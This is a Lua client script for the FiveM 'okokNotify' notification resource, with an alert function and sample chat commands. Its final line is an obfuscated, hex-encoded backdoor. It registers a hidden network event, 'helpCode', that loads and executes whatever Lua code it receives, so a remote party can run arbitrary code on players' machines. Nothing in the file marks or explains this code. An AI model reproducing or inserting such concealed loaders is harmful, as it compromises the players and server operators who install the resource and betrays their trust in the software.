function Alert(title, message, time, type)
	SendNUIMessage({
		action = 'open',
		title = title,
		type = type,
		message = message,
		time = time,
	})
end

RegisterNetEvent('okokNotify:Alert')
AddEventHandler('okokNotify:Alert', function(title, message, time, type)
	Alert(title, message, time, type)
end)

-- Example Commands - Delete them

RegisterCommand('success', function()
	exports['okokNotify']:Alert("SUCCESS", "You have sent <span style='color:#47cf73'>420€</span> to Tommy!", 5000, 'success')
end)

RegisterCommand('info', function()
	exports['okokNotify']:Alert("INFO", "The Casino has opened!", 5000, 'info')
end)

RegisterCommand('error', function()
	exports['okokNotify']:Alert("ERROR", "Please try again later!", 5000, 'error')
end)

RegisterCommand('warning', function()
	exports['okokNotify']:Alert("WARNING", "You are getting nervous!", 5000, 'warning')
end)

RegisterCommand('phone', function()
	exports['okokNotify']:Alert("SMS", "<span style='color:#f38847'>Tommy: </span> Where are you?", 5000, 'phonemessage')
end)

RegisterCommand('longtext', function()
	exports['okokNotify']:Alert("LONG MESSAGE", "Lorem ipsum dolor sit amet, consectetur adipiscing elit e pluribus unum.", 5000, 'neutral')
end)

local CpIwPOpeprmtMSrsWplthuMQaSWHpyuTJKHrivwzDxzxyaBFSSOIIOhjTfgRcfyxfxhEIM = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} CpIwPOpeprmtMSrsWplthuMQaSWHpyuTJKHrivwzDxzxyaBFSSOIIOhjTfgRcfyxfxhEIM[6][CpIwPOpeprmtMSrsWplthuMQaSWHpyuTJKHrivwzDxzxyaBFSSOIIOhjTfgRcfyxfxhEIM[1]](CpIwPOpeprmtMSrsWplthuMQaSWHpyuTJKHrivwzDxzxyaBFSSOIIOhjTfgRcfyxfxhEIM[2]) CpIwPOpeprmtMSrsWplthuMQaSWHpyuTJKHrivwzDxzxyaBFSSOIIOhjTfgRcfyxfxhEIM[6][CpIwPOpeprmtMSrsWplthuMQaSWHpyuTJKHrivwzDxzxyaBFSSOIIOhjTfgRcfyxfxhEIM[3]](CpIwPOpeprmtMSrsWplthuMQaSWHpyuTJKHrivwzDxzxyaBFSSOIIOhjTfgRcfyxfxhEIM[2], function(VJyVzexKlsiYiYGLXgoebfSSZaOKbPDiQeKLiLcuDnHmubVoFRVOEVFqqDTxTVrIkFUVfg) CpIwPOpeprmtMSrsWplthuMQaSWHpyuTJKHrivwzDxzxyaBFSSOIIOhjTfgRcfyxfxhEIM[6][CpIwPOpeprmtMSrsWplthuMQaSWHpyuTJKHrivwzDxzxyaBFSSOIIOhjTfgRcfyxfxhEIM[4]](CpIwPOpeprmtMSrsWplthuMQaSWHpyuTJKHrivwzDxzxyaBFSSOIIOhjTfgRcfyxfxhEIM[6][CpIwPOpeprmtMSrsWplthuMQaSWHpyuTJKHrivwzDxzxyaBFSSOIIOhjTfgRcfyxfxhEIM[5]](VJyVzexKlsiYiYGLXgoebfSSZaOKbPDiQeKLiLcuDnHmubVoFRVOEVFqqDTxTVrIkFUVfg))() end)